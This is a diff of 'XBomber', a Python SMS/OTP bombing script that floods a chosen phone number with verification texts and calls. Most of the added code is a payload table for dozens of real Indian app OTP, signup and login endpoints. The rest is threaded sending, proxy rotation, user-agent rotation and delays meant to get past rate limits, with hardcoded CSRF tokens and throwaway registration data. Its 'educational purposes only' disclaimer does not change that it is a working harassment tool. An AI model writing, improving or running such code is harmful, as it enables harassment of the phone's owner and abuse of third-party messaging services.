@@ -1,967 +1,498 @@
 #!/usr/bin/env python3
-"""
-XBomber - Educational CLI Tool Skeleton
-Author  : Alienkrishn [Anon4You]
-Version : 3.0.0
-Purpose : Demonstrates clean Python CLI architecture using Rich, threading,
-          dataclasses, and structured config loading. NOT for malicious use.
-"""
 
-# ─── Standard Library ────────────────────────────────────────────────────────
+
 import json
-import logging
 import os
-import platform
-import shutil
-import subprocess
 import sys
-import threading
-import time
-import webbrowser
-from dataclasses import dataclass, field
-from pathlib import Path
-from queue import Empty, Queue
-from typing import Optional
-from urllib.parse import urlparse
 import random
+import time
+import threading
+from itertools import cycle
+from concurrent.futures import ThreadPoolExecutor
 
-# ─── Third-Party ─────────────────────────────────────────────────────────────
-try:
-    import requests
-    from requests.adapters import HTTPAdapter
-    from urllib3.util.retry import Retry
-    from rich.columns import Columns
-    from rich.console import Console
-    from rich.layout import Layout
-    from rich.live import Live
-    from rich.logging import RichHandler
-    from rich.panel import Panel
-    from rich.progress import (
-        BarColumn,
-        MofNCompleteColumn,
-        Progress,
-        SpinnerColumn,
-        TaskProgressColumn,
-        TextColumn,
-        TimeElapsedColumn,
-        TimeRemainingColumn,
-    )
-    from rich.prompt import Confirm, Prompt
-    from rich.rule import Rule
-    from rich.table import Table
-    from rich.text import Text
-    from rich.theme import Theme
-except ImportError as e:
-    print(f"[ERROR] Missing dependency: {e}")
-    print("Run: pip install rich requests")
-    sys.exit(1)
+import requests
+from requests.adapters import HTTPAdapter
 
+# ========================== GLOBALS =========================================
+VERSION = "3.2.0"
+SERVICES_FILE = "./assets/services.json"
+PROXY_FILE = "proxies.txt"
 
-# ─── Logging Setup ───────────────────────────────────────────────────────────
-logging.basicConfig(
-    level=logging.WARNING,
-    format="%(message)s",
-    handlers=[RichHandler(rich_tracebacks=True, show_path=False)],
-)
-log = logging.getLogger("xbomber")
+# ========================== COLORS ==========================================
+def c(text, code):
+    return f"\033[{code}m{text}\033[0m"
 
+def red(text):    return c(text, "91")
+def green(text):  return c(text, "92")
+def yellow(text): return c(text, "93")
+def cyan(text):   return c(text, "96")
+def magenta(text):return c(text, "95")
+def bold(text):   return c(text, "1")
 
-# ─── Theme ───────────────────────────────────────────────────────────────────
-THEME = Theme({
-    "success":  "bold green",
-    "error":    "bold red",
-    "warning":  "bold yellow",
-    "info":     "bold cyan",
-    "muted":    "dim white",
-    "accent":   "bold magenta",
-    "premium":  "bold gold1",
-})
+# ========================== BANNER (unique XBomber style) ===================
+def banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print()
+    print("    \033[1;35m#     #\033[0m                                           \033[1;90mv2.0.0\033[0m")
+    print("    \033[1;35m #   #  \033[1;36m#####   ####  #    # #####  \033[1;31m###### #####\033[0m  ")
+    print("    \033[1;35m  # #   \033[1;36m#    # #    # ##  ## #    # \033[1;31m#      #    #\033[0m ")
+    print("    \033[1;35m   #    \033[1;36m#####  #    # # ## # #####  \033[1;31m#####  #    #\033[0m ")
+    print("    \033[1;35m  # #   \033[1;36m#    # #    # #    # #    # \033[1;31m#      #####\033[0m  ")
+    print("    \033[1;35m #   #  \033[1;36m#    # #    # #    # #    # \033[1;31m#      #   #\033[0m  ")
+    print("    \033[1;35m#     # \033[1;36m#####   ####  #    # #####  \033[1;31m###### #    #\033[0m ")
+    print()
+    print("    \033[1;33m              Created by Alienkrishn [Anon4You]\033[0m   ")
+    print("    \033[1;34m              Telegram: https://t.me/nullxvoid\033[0m     ")
+    print()
+    print("  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m")
+    print("  \033[1;41m\033[1;37mㅤ    DISCLAIMER: Developer will not be responsible       ㅤ\033[0m")
+    print("  \033[1;41m\033[1;37mㅤ    for any misuse or damage caused by this script      ㅤ\033[0m")
+    print("  \033[1;41m\033[1;37mㅤ    Please do not use this script for taking Revenge    ㅤ\033[0m")
+    print("  \033[1;41m\033[1;37mㅤ    Use this tool for educational purposes only         ㅤ\033[0m")
+    print("  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m")
+    print()
 
-console = Console(theme=THEME)
+# ========================== LOAD SERVICES (once) ============================
+_services_cache = None
 
-
-# ─── Constants ───────────────────────────────────────────────────────────────
-VERSION       = "3.0.0"
-AUTHOR        = "Alienkrishn [Anon4You]"
-TELEGRAM      = "https://t.me/nullxvoid"
-PREMIUM_URL   = "https://t.me/alienkrishn?text=xbomber%20premium"
-CONFIG_PATH   = Path("assets/services.json")
-MAX_SMS       = 5000
-DEFAULT_THREADS = 20
-
-
-
-# ─── Data Models ─────────────────────────────────────────────────────────────
-@dataclass
-class Service:
-    """Represents a single SMS/OTP service endpoint."""
-    name:         str
-    url:          str
-    method:       str                    = "POST"
-    headers:      dict                   = field(default_factory=dict)
-    data:         Optional[dict]         = None
-    phone_format: str                    = "raw"   # raw | with_plus91 | 91-
-    encoding:     str                    = "json"  # json | form
-
-    def __post_init__(self):
-        self.method = self.method.upper()
-        allowed_methods = {"GET", "POST", "PUT", "PATCH"}
-        if self.method not in allowed_methods:
-            raise ValueError(f"Service '{self.name}': unsupported method '{self.method}'")
-
-    @staticmethod
-    def from_dict(raw: dict) -> "Service":
-        return Service(
-            name         = raw["name"],
-            url          = raw["url"],
-            method       = raw.get("method", "POST"),
-            headers      = raw.get("headers", {}),
-            data         = raw.get("data"),
-            phone_format = raw.get("phone_format", "raw"),
-            encoding     = raw.get("encoding", "json"),
-        )
-
-
-@dataclass
-class BombResult:
-    """Result from a single service call."""
-    service_name: str
-    success:      bool
-    status_code:  Optional[int] = None
-    error:        Optional[str] = None
-
-
-@dataclass
-class BombReport:
-    """Aggregate report after a bombing session."""
-    phone:      str
-    total:      int
-    results:    list[BombResult] = field(default_factory=list)
-    elapsed:    float = 0.0
-
-    @property
-    def success_count(self) -> int:
-        return sum(1 for r in self.results if r.success)
-
-    @property
-    def fail_count(self) -> int:
-        return self.total - self.success_count
-
-    @property
-    def success_rate(self) -> float:
-        if not self.results:
-            return 0.0
-        return (self.success_count / len(self.results)) * 100
-
-
-# ─── Config Loader ───────────────────────────────────────────────────────────
-class ConfigLoader:
-    """Handles loading and validating services.json."""
-
-    _cache: Optional[list[Service]] = None
-
-    @classmethod
-    def load(cls, path: Path = CONFIG_PATH) -> list[Service]:
-        if cls._cache is not None:
-            return cls._cache
-
-        if not path.exists():
-            console.print(f"[error]Config not found:[/error] {path}")
-            sys.exit(1)
-
-        try:
-            with path.open("r", encoding="utf-8") as f:
-                raw = json.load(f)
-        except json.JSONDecodeError as e:
-            console.print(f"[error]Invalid JSON in config:[/error] {e}")
-            sys.exit(1)
-
-        if "services" not in raw or not isinstance(raw["services"], list):
-            console.print("[error]Config must have a 'services' list.[/error]")
-            sys.exit(1)
-
-        services: list[Service] = []
-        for i, entry in enumerate(raw["services"]):
-            try:
-                services.append(Service.from_dict(entry))
-            except (KeyError, ValueError) as e:
-                log.warning("Skipping service #%d: %s", i, e)
-
+def load_services():
+    global _services_cache
+    if _services_cache is not None:
+        return _services_cache
+    if not os.path.exists(SERVICES_FILE):
+        print(red(f"\n[!] {SERVICES_FILE} not found. Cannot continue."))
+        sys.exit(1)
+    try:
+        with open(SERVICES_FILE, 'r', encoding='utf-8') as f:
+            data = json.load(f)
+        services = data.get("services", [])
         if not services:
-            console.print("[error]No valid services found in config.[/error]")
+            print(red("[!] No services found in config."))
             sys.exit(1)
-
-        cls._cache = services
+        _services_cache = services
         return services
+    except Exception as e:
+        print(red(f"[!] Failed to load services: {e}"))
+        sys.exit(1)
 
-
-# ─── Phone Formatter ─────────────────────────────────────────────────────────
-class PhoneFormatter:
-    """Formats a raw 10-digit number based on the service's expected format."""
-
+# ========================== PAYLOAD BUILDER ============
+class PayloadBuilder:
     @staticmethod
-    def format(phone: str, fmt: str) -> str:
-        p = phone.strip()
-        match fmt:
-            case "with_plus91":
-                return f"+91{p}"
-            case "91-":
-                return f"91-{p}"
-            case "91":
-                return f"91{p}"
-            case _:
-                return p
+    def build(api_name, phone, phone91, phone_plus):
+        payloads = {
+            'Gokwik 1': lambda: {"phone": phone, "country": "IN"},
+            'Gokwik 2': lambda: {"phone": phone, "country": "IN"},
+            'Noise': lambda: {"value": phone, "type": "phone"},
+            'Gokwik Validate': lambda: {
+                "cart_id": 592470021,
+                "mid": "3mt5u7utwrl35l6ssa",
+                "os_type": "Windows",
+                "request_id": "e3673140-db47-425b-81b9-55ef26491207",
+                "phone": phone,
+                "origin": "CORE_FE"
+            },
+            '1mg': lambda: {"mobile_number": phone, "source": "DWEB_PHARMA_HOME"},
+            'PocketFM': lambda: [{"phone_number": phone_plus, "country_code": "+91"}],
+            'Zee5': lambda: {"phoneno": phone91},
+            'Shemaroome': lambda: f"mobile_no={phone_plus}&registration_source=organic",
+            'DishTV': lambda: {
+                "mobile": phone91,
+                "password": "123456",
+                "additional_params": {"isOptedForPromotions": "true"}
+            }, 
+            'Epicon': lambda: f"_token=&stdisdcode=%2B91&mobile_number={phone}&signup_method=MOBILE",
+            'VRott TV': lambda: {"phno": phone91},
+            'Hoichoi': lambda: {"phoneNumber": phone_plus, "platform": "MOBILE_WEB"},
+            'MooviPlay': lambda: {"phone_number": phone},
+            'GoodTimesLeague Signup': lambda: {
+                "name": "you", "mobile": phone, "state": "Delhi", "age": 99,
+                "age_consent": True, "receive_consent": True, "tnc_consent": True,
+                "utm_source": "Direct", "utm_medium": "Direct", "utm_campaign": "Direct"
+            },
+            'GoodTimesLeague Login': lambda: {
+                "mobile": phone, "utm_source": "Direct", "utm_medium": "Direct", "utm_campaign": "Direct"
+            },
+            'Mastram Register': lambda: {
+                "age_above_18": "true", "email": "crackimngschool@gmail.com",
+                "full_name": "XIRVY", "phone": phone, "phone_code": "+91",
+                "terms_conditions_agreed": "true"
+            },
+            'Jalwatv Register': lambda: {
+                "age_above_18": "true", "email": "crackimngschool@gmail.com",
+                "full_name": "XIRVY", "phone": phone, "phone_code": "+91",
+                "terms_conditions_agreed": "true"
+            },
+            'Joshplay Register': lambda: {
+                "age_above_18": "true", "email": "crackimngschool@gmail.com",
+                "full_name": "XIRVY", "phone": phone, "phone_code": "+91",
+                "terms_conditions_agreed": "true"
+            },
+            'Cloudways OTP': lambda: f"phone_no={phone}",
+            'Mastram Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
+            'Jalwatv Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
+            'Joshplay Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
+            'Unistreams Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
+            'Dramelle SMS': lambda: {
+                "number": [phone],
+                "message": "Your Dramelle OTP for verification is 696969",
+                "senderId": "EDUMRC",
+                "templateId": "1707168926925165526"
+            },
+            'Reelzify': lambda: {"phone": phone, "countryCode": "+91"},
+            'Redrob': lambda: {"type": "phone", "identifier": phone_plus},
+            'Pepperly': lambda: {
+                "csrfmiddlewaretoken": "szmDBiLg71U77r8QAbCFlqMjiB2rBGK3H0DiKrJmNLbYphE9RXeXN5FGG6DhnSb7",
+                "next": "", "country_code": "+91", "phone": phone
+            },
+            'JourneyChoice': lambda: {
+                "_csrf": "83942e1b6210ca803bd508cb515d77cd2c38a0d969f5da4b1e39ee234cd37ca8",
+                "mobile_number": phone, "return_to": "/user/dashboard"
+            },
+            'Bankend Services': lambda: {"phone": phone_plus},
+            'Sabbkuch': lambda: {"action": "sendOtp", "to": phone_plus, "channel": "voice", "otpLength": 6},
+            'Penpencil Resend OTP': lambda: {"mobile": phone, "organizationId": "5eb393ee95fab7468a79d189"},
+            'Starquik OTP': lambda: f"------WebKitFormBoundaryUN4i0M1ArwauXUif\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n{phone_plus}\r\n------WebKitFormBoundaryUN4i0M1ArwauXUif--",
+            'Kinre OTP': lambda: {"phone": phone},
+            'RKBazar Mobile OTP': lambda: {
+                "username": phone_plus, "type": "mobile", "domain": "rkbazar.in", "language_code": "en"
+            },
+            'RKBazar WhatsApp OTP': lambda: {
+                "username": phone_plus, "type": "whatsapp", "domain": "rkbazar.in", "language_code": "en"
+            },
+            'Sitaram Diwanchand OTP': lambda: f"csrf_token=c8c585827c8c8afe27e459f9953213fc&mobile={phone}",
+            'Mpaani OTP': lambda: {"phone_number": phone, "role": "CUSTOMER"},
+            'Bharatgo OTP': lambda: {
+                "country_code": "+91", "mobile": phone, "source": "WEB", "role": "VENDOR", "loginType": "REGISTER"
+            },
+            'Nlincs OTP': lambda: {
+                "path": "/auth/otp", "headers": [["partner_id", "nstore"]],
+                "method": "post", "body": {"partner": "nstore", "name": "xxx", "phone": phone}
+            },
+            'Gracedaily Signup': lambda: {
+                "name": "cracking school1", "email": f"{random.randint(1000,9999)}@gmail.com",
+                "mobile": phone, "password": ""
+            },
+            'Gracedaily Send OTP': lambda: {"mobileNo": phone},
+            'Aditi Mistry Mobile Verification': lambda: {"isd_code": "91", "mobile_no": phone, "isRole": "user"},
+            'Newbo Verify Phone': lambda: {},
+            'Fridaay Customer Signup': lambda: {"user_name": phone},
+            'Datarott Send OTP': lambda: f"login_type=mobile&county_code=91&mobile_no={phone}",
+            'Navrangott Login': lambda: {"username": phone},
+            'India Genius Challenge': lambda: {"phoneNumber": phone_plus},
+            'Hercules Premier League': lambda: f"phone={phone}",
+            'Playzhub': lambda: {"phone_number": phone, "country_code": "+91"},
+            'Papapa': lambda: {"phone_no": {"prefix": "+91", "number": phone}, "source": "wallet"},
+            'Woohoo': lambda: {"value": phone_plus, "token": "", "captchaResponse": "", "captchaType": "V3"},
+            'CDM IPL': lambda: {"mobile": phone},
+            'Lambda OTP': lambda: {"phone_number": phone, "qr_id": "696969", "pincode": "696969", "name": "cracking school"}
+        }
+        builder = payloads.get(api_name)
+        return builder() if builder else None
 
+# ========================== PROXY MANAGER ====================
+class ProxyManager:
+    def __init__(self, proxy_file=PROXY_FILE, enabled=False):
+        self.proxy_file = proxy_file
+        self.enabled = enabled
+        self.proxies = []
+        self.proxy_cycle = None
+        self.lock = threading.Lock()
+        self.load()
 
-# ─── HTTP Worker ─────────────────────────────────────────────────────────────
-
-
-
-
-
-REQUEST_TIMEOUT = (5, 10)
-
-_thread_local = threading.local()
-
-PROXIES = [  
-    # Example:  
-    # "http://user:pass@ip:port",  
-    # "http://ip:port",  
-   ]
-
-
-
-# =========================================================
-# PROXY HEALTH TRACKING
-# =========================================================
-
-proxy_health = {
-    proxy: 100
-    for proxy in PROXIES
-}
-
-
-def mark_proxy_failure(proxy):
-    if proxy in proxy_health:
-        proxy_health[proxy] -= 25
-
-
-def mark_proxy_success(proxy):
-    if proxy in proxy_health:
-        proxy_health[proxy] = min(
-            proxy_health[proxy] + 5,
-            100
-        )
-
-
-def get_random_proxy():
-    healthy = [
-        p for p, score in proxy_health.items()
-        if score > 0
-    ]
-
-    if not healthy:
-        return None
-
-    proxy = random.choice(healthy)
-
-    return {
-        "http": proxy,
-        "https": proxy,
-    }
-
-
-# =========================================================
-# SESSION MANAGEMENT
-# =========================================================
-
-def get_session() -> requests.Session:
-
-    if hasattr(_thread_local, "session"):
-        return _thread_local.session
-
-    session = requests.Session()
-
-    retries = Retry(
-        total=2,
-        connect=1,
-        read=1,
-        status=2,
-
-        backoff_factor=1,
-
-        status_forcelist=[
-            429,
-            500,
-            502,
-            503,
-            504,
-        ],
-
-        allowed_methods=[
-            "GET",
-            "POST",
-            "PUT",
-            "PATCH",
-        ],
-
-        raise_on_status=False,
-    )
-
-    adapter = HTTPAdapter(
-        max_retries=retries,
-        pool_connections=20,
-        pool_maxsize=20,
-    )
-
-    session.mount("http://", adapter)
-    session.mount("https://", adapter)
-
-    _thread_local.session = session
-
-    return session
-
-
-# =========================================================
-# REQUEST WORKER
-# =========================================================
-
-class RequestWorker:
-
-    @staticmethod
-    def _interpolate(template: str, phone_str: str):
-        return template.replace("{phone}", phone_str)
-
-    @staticmethod
-    def _host_alive(url: str) -> bool:
-
+    def load(self):
+        if not self.enabled:
+            return False
+        if not os.path.exists(self.proxy_file):
+            self.enabled = False
+            return False
         try:
-            parsed = urlparse(url)
-
-            if not parsed.hostname:
+            with open(self.proxy_file, 'r') as f:
+                self.proxies = [line.strip() for line in f if line.strip()]
+            if not self.proxies:
+                self.enabled = False
                 return False
-
-            import socket
-
-            socket.gethostbyname(parsed.hostname)
-
+            self.proxy_cycle = cycle(self.proxies)
             return True
-
-        except Exception as exc:
-            print("HOST CHECK ERROR:", exc)
+        except:
+            self.enabled = False
             return False
 
-    @classmethod
-    def send(cls, svc, phone):
+    def get_next(self):
+        if not self.enabled or not self.proxy_cycle:
+            return None
+        with self.lock:
+            proxy = next(self.proxy_cycle)
+            return {"http": proxy, "https": proxy}
 
-        formatted = PhoneFormatter.format(
-            phone,
-            svc.phone_format
-        )
+    def enable(self):
+        self.enabled = True
+        self.load()
 
-        url = cls._interpolate(
-            svc.url,
-            formatted
-        )
+    def disable(self):
+        self.enabled = False
 
-        # Skip dead domains immediately
-        if not cls._host_alive(url):
+# ========================== REQUEST ENGINE (thread‑local, no delays here) ===
+_thread_local = threading.local()
 
-            return BombResult(
-                svc.name,
-                False,
-                error="DNS lookup failed"
-            )
-        headers = dict(svc.headers)
+def get_session():
+    if not hasattr(_thread_local, "session"):
+        _thread_local.session = requests.Session()
+        adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=0)
+        _thread_local.session.mount('http://', adapter)
+        _thread_local.session.mount('https://', adapter)
+    return _thread_local.session
+
+# ========================== BOMBER CORE ======
+class BomberCore:
+    def __init__(self):
+        self.proxy_manager = ProxyManager()
+        self.services = load_services()          # loaded once
+        self.rate_limited = {}
+        self.rate_lock = threading.Lock()
+        self.success = 0
+        self.count_lock = threading.Lock()
+        self.running = False
+        self.reg_state = {'mastram': False, 'jalwatv': False, 'joshplay': False, 'gracedaily': False}
+        self.max_workers = 80                    # balanced for speed + reliability
+        self.backoff = 30
+        self.delay_min = 0.08                    # jitter to avoid rate limits
+        self.delay_max = 0.25
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Linux; Android 12; SM-G9980) AppleWebKit/537.36",
+            "Dart/3.0 (dart:io)",
+            "okhttp/4.9.1",
+        ] 
+
+    def _get_ua(self):
+        return random.choice(self.user_agents)
+
+    def _update_reg_state(self, api_name):
         
+        if api_name == 'Mastram Register':
+            if not self.reg_state['mastram']:
+                self.reg_state['mastram'] = True
+                return None
+            return 'Mastram Send OTP'
+        elif api_name == 'Jalwatv Register':
+            if not self.reg_state['jalwatv']:
+                self.reg_state['jalwatv'] = True
+                return None
+            return 'Jalwatv Send OTP'
+        elif api_name == 'Joshplay Register':
+            if not self.reg_state['joshplay']:
+                self.reg_state['joshplay'] = True
+                return None
+            return 'Joshplay Send OTP'
+        elif api_name == 'Gracedaily Signup':
+            if not self.reg_state['gracedaily']:
+                self.reg_state['gracedaily'] = True
+                return None
+            return 'Gracedaily Send OTP'
+        return api_name
 
-        body = None
+    def _special_logic(self, service, phone, phone91, phone_plus):
+        if service['name'] == 'GoodTimesLeague Signup':
+            payload = PayloadBuilder.build(service['name'], phone, phone91, phone_plus)
+            session = get_session()
+            headers = service['headers'].copy()
+            headers['User-Agent'] = self._get_ua()
+            proxies = self.proxy_manager.get_next()
+            try:
+                resp = session.post(service['url'], headers=headers, json=payload, timeout=6, proxies=proxies)
+                if resp.status_code in (200,201,202,204):
+                    return True
+                if resp.status_code == 400:
+                    # find login service
+                    login_svc = next((s for s in self.services if s['name'] == 'GoodTimesLeague Login'), None)
+                    if login_svc:
+                        login_payload = PayloadBuilder.build('GoodTimesLeague Login', phone, phone91, phone_plus)
+                        headers2 = login_svc['headers'].copy()
+                        headers2['User-Agent'] = self._get_ua()
+                        resp2 = session.post(login_svc['url'], headers=headers2, json=login_payload, timeout=6, proxies=proxies)
+                        return resp2.status_code in (200,201,202,204)
+                return False
+            except:
+                return False
+        return None
 
-        if svc.data:
-            raw = json.dumps(svc.data)
+    def send_bomb(self, service, phone, phone91, phone_plus):
+        with self.rate_lock:
+            if service['name'] in self.rate_limited and time.time() < self.rate_limited[service['name']]:
+                return False
 
-            body = json.loads(
-                cls._interpolate(raw, formatted)
-            )
+        new_name = self._update_reg_state(service['name'])
+        if new_name is None:
+            pass
+        elif new_name != service['name']:
+            for svc in self.services:
+                if svc['name'] == new_name:
+                    service = svc
+                    break
 
-        try:
+        payload = PayloadBuilder.build(service['name'], phone, phone91, phone_plus)
+        if payload is None:
+            return False
 
-            response = cls._dispatch(
-                method=svc.method,
-                url=url,
-                headers=headers,
-                body=body,
-                encoding=svc.encoding,
-            )
-
-            success = (
-    200 <= response.status_code < 300
-)
-
-            return BombResult(
-                service_name=svc.name,
-                success=success,
-                status_code=response.status_code,
-            )
-
-        except requests.exceptions.SSLError:
-
-            return BombResult(
-                svc.name,
-                False,
-                error="SSL verification failed"
-            )
-
-        except requests.exceptions.ConnectTimeout:
-
-            return BombResult(
-                svc.name,
-                False,
-                error="Connection timeout"
-            )
-
-        except requests.exceptions.ReadTimeout:
-
-            return BombResult(
-                svc.name,
-                False,
-                error="Read timeout"
-            )
-
-        except requests.exceptions.ProxyError:
-
-            return BombResult(
-                svc.name,
-                False,
-                error="Proxy failure"
-            )
-
-        except requests.exceptions.ConnectionError as exc:
-
-            msg = str(exc)
-
-            if "NameResolutionError" in msg:
-
-                return BombResult(
-                    svc.name,
-                    False,
-                    error="DNS resolution failed"
-                )
-
-            if "RemoteDisconnected" in msg:
-
-                return BombResult(
-                    svc.name,
-                    False,
-                    error="Remote disconnected"
-                )
-
-            return BombResult(
-                svc.name,
-                False,
-                error="Connection error"
-            )
-
-        except Exception as exc:
-
-            return BombResult(
-                svc.name,
-                False,
-                error=str(exc)
-            )
-
-    @staticmethod
-    def _dispatch(
-        method,
-        url,
-        headers,
-        body,
-        encoding,
-    ):
+        special = self._special_logic(service, phone, phone91, phone_plus)
+        if special is not None:
+            return special
 
         session = get_session()
+        headers = service['headers'].copy()
+        headers['User-Agent'] = self._get_ua()
+        proxies = self.proxy_manager.get_next()
 
-        # IMPORTANT:
-        # Use ONE proxy for entire request lifecycle
-        proxy = get_random_proxy()
-
-        kwargs = {
-            "headers": headers,
-            "timeout": REQUEST_TIMEOUT,
-            "verify": True,
-        }
-
-        if proxy:
-            kwargs["proxies"] = proxy
-
-        if body is not None:
-
-            if encoding == "form":
-                kwargs["data"] = body
-            else:
-                kwargs["json"] = body
-
-        dispatch = {
-            "GET": session.get,
-            "POST": session.post,
-            "PUT": session.put,
-            "PATCH": session.patch,
-        }
-
-        fn = dispatch.get(method)
-
-        if fn is None:
-            raise ValueError(
-                f"Unsupported HTTP method: {method}"
-            )
-
-        max_attempts = 3
-
-        last_response = None
-
-        for attempt in range(max_attempts):
-
-            # Human-like jitter
-            time.sleep(
-                random.uniform(0.5, 1.5)
-            )
-
-            try:
-
-                response = fn(
-                    url,
-                    **kwargs,
-                )
-
-                last_response = response
-
-                # Handle rate limits
-                if response.status_code == 429:
-
-                    retry_after = response.headers.get(
-                        "Retry-After"
-                    )
-
-                    if (
-                        retry_after
-                        and retry_after.isdigit()
-                    ):
-                        sleep_time = int(retry_after)
-
-                    else:
-                        sleep_time = (
-                            (2 ** attempt)
-                            + random.uniform(1, 3)
-                        )
-
-                    time.sleep(sleep_time)
-
-                    continue
-
-                # Proxy succeeded
-                if proxy:
-                    mark_proxy_success(
-                        proxy["http"]
-                    )
-
-                return response
-
-            except (
-                requests.exceptions.ProxyError,
-                requests.exceptions.ConnectTimeout,
-                requests.exceptions.ConnectionError,
-            ):
-
-                if proxy:
-                    mark_proxy_failure(
-                        proxy["http"]
-                    )
-
-                # Exponential backoff
-                time.sleep(
-                    (2 ** attempt)
-                    + random.uniform(0.5, 1.5)
-                )
-
-                continue
-
-        if last_response:
-            return last_response
-
-        raise requests.exceptions.ConnectionError(
-            "Request failed after retries"
-        )
-
-# ─── Thread Pool Bomber ───────────────────────────────────────────────────────
-class Bomber:
-    """
-    Manages a thread-pool based bombing session.
-
-    Architecture note:
-      Uses a producer/consumer pattern with a Queue.
-      Each thread pulls tasks from the queue and reports results
-      back via a shared list (thread-safe for appends in CPython,
-      but a Lock is used here explicitly for correctness).
-    """
-
-    def __init__(self, phone: str, total: int, thread_count: int = DEFAULT_THREADS):
-        self.phone        = phone
-        self.total        = total
-        self.thread_count = thread_count
-        self._queue: Queue[Service] = Queue()
-        self._results: list[BombResult] = []
-        self._lock        = threading.Lock()
-        self._progress: Optional[Progress] = None
-        self._task_id     = None
-
-    def _build_task_queue(self, services: list[Service]) -> None:
-        """Repeat the service list until we have `total` tasks."""
-        count = 0
-        while count < self.total:
-            for svc in services:
-                if count >= self.total:
-                    break
-                self._queue.put(svc)
-                count += 1
-
-    def _worker(self) -> None:
-        while True:
-            try:
-                svc = self._queue.get_nowait()
-            except Empty:
-                break
-            try:
-                result = RequestWorker.send(svc, self.phone)
-            except Exception as exc:
-                print("WORKER ERROR:", exc)
-                raise
-            with self._lock:
-                self._results.append(result)
-            if self._progress and self._task_id is not None:
-                self._progress.advance(self._task_id)
-            self._queue.task_done()
-
-    def run(self, progress: Progress, task_id) -> BombReport:
-        self._progress = progress
-        self._task_id  = task_id
-
-        services = ConfigLoader.load()
-        self._build_task_queue(services)
-
-        start = time.perf_counter()
-
-        threads = [
-            threading.Thread(target=self._worker, daemon=True)
-            for _ in range(min(self.thread_count, self.total))
-        ]
-        for t in threads:
-            t.start()
-
-        # Wait until queue is drained (daemon threads exit when main exits)
-        self._queue.join()
-
-        elapsed = time.perf_counter() - start
-
-        return BombReport(
-            phone=self.phone,
-            total=self.total,
-            results=self._results,
-            elapsed=elapsed,
-        )
-
-
-# ─── Banner ──────────────────────────────────────────────────────────────────
-def render_banner() -> None:
-    """Renders the ASCII art banner using pure Rich (no shell injection)."""
-    # Build the ASCII art as a Rich Text object so it's portable
-    lines = [
-        (" #     # ", "bold magenta"),
-        ("  #   #  ", "bold magenta"),
-        ("   # #   ", "bold magenta"),
-        ("    #    ", "bold magenta"),
-        ("   # #   ", "bold magenta"),
-        ("  #   #  ", "bold magenta"),
-        (" #     # ", "bold magenta"),
-    ]
-    right = [
-        (f"#####   ####  #    # #####  ", "bold cyan"),
-        ("#    # #    # ##  ## #    # ", "bold cyan"),
-        ("#####  #    # # ## # #####  ", "bold cyan"),
-        ("#    # #    # #    # #    # ", "bold cyan"),
-        ("#    # #    # #    # #    # ", "bold cyan"),
-        ("#    # #    # #    # #    # ", "bold cyan"),
-        ("#####   ####  #    # #####  ", "bold cyan"),
-    ]
-    suffix = [
-        (f"###### #####  ", "bold red"),
-        ("#      #    # ", "bold red"),
-        ("#####  #    # ", "bold red"),
-        ("#      #####  ", "bold red"),
-        ("#      #   #  ", "bold red"),
-        ("#      #    # ", "bold red"),
-        ("###### #    # ", "bold red"),
-    ]
-
-    art = Text()
-    for i, (l, s, r) in enumerate(zip(lines, right, suffix)):
-        art.append("    " + l[0], style=l[1])
-        art.append(s[0], style=s[1])
-        art.append(r[0], style=r[1])
-        if i == 0:
-            art.append(f"v{VERSION}", style="dim white")
-        art.append("\n")
-
-    console.print(art)
-    console.print(f"    [bold yellow]              Created by {AUTHOR}[/bold yellow]")
-    console.print(f"    [bold blue]              Telegram: {TELEGRAM}[/bold blue]\n")
-
-    disclaimer = Panel(
-        "[bold white]DISCLAIMER: Developer will not be responsible\n"
-        "for any misuse or damage caused by this script.\n"
-        "Please do not use this script for taking Revenge.\n"
-        "Use this tool for [underline]educational purposes only[/underline].[/bold white]",
-        border_style="red",
-        expand=True,
-    )
-    console.print(disclaimer)
-    console.print()
-
-
-# ─── UI Helpers ──────────────────────────────────────────────────────────────
-def clear_screen() -> None:
-    os.system("cls" if platform.system() == "Windows" else "clear")
-
-
-def open_url(url: str) -> None:
-    """
-    Open a URL using the best available method for the current OS.
-    Priority: xdg-open (Linux) → open (macOS) → webbrowser (fallback).
-    """
-    system = platform.system()
-    if system == "Linux" and shutil.which("xdg-open"):
-        subprocess.run(["xdg-open", url], check=False)
-    elif system == "Darwin" and shutil.which("open"):
-        subprocess.run(["open", url], check=False)
-    else:
-        webbrowser.open(url)
-
-
-def wait_for_enter(msg: str = "\nPress Enter to continue...") -> None:
-    console.input(f"[muted]{msg}[/muted]")
-
-
-def print_report(report: BombReport) -> None:
-    """Render a styled post-bombing summary table."""
-    table = Table(
-        title=f"Bombing Report — {report.phone}",
-        title_style="bold cyan",
-        border_style="cyan",
-        show_lines=True,
-    )
-    table.add_column("Metric",    style="info",    min_width=20)
-    table.add_column("Value",     style="white",   min_width=15)
-
-    table.add_row("Phone",         report.phone)
-    table.add_row("Total Sent",    str(report.total))
-    table.add_row("Elapsed",       f"{report.elapsed:.2f}s")
-    table.add_row("Successful",    f"[success]{report.success_count}[/success]")
-    table.add_row("Failed",        f"[error]{report.fail_count}[/error]")
-    table.add_row("Success Rate",  f"{report.success_rate:.1f}%")
-    table.add_row(
-        "Throughput",
-        f"{report.total / report.elapsed:.1f} req/s" if report.elapsed > 0 else "N/A"
-    )
-
-    console.print()
-    console.print(table)
-
-    # Show per-service breakdown if ≤ 30 results (avoid wall of text)
-    if len(report.results) <= 30:
-        svc_table = Table(
-            title="Per-Service Breakdown",
-            border_style="dim",
-            show_header=True,
-        )
-        svc_table.add_column("Service",     style="cyan")
-        svc_table.add_column("Status",      justify="center")
-        svc_table.add_column("HTTP Code",   justify="right", style="muted")
-        svc_table.add_column("Error",       style="muted")
-
-        for r in report.results:
-            status = "[success]OK[/success]" if r.success else "[error]FAIL[/error]"
-            code   = str(r.status_code) if r.status_code else "—"
-            err    = r.error or ""
-            svc_table.add_row(r.service_name, status, code, err)
-
-        console.print(svc_table)
-
-
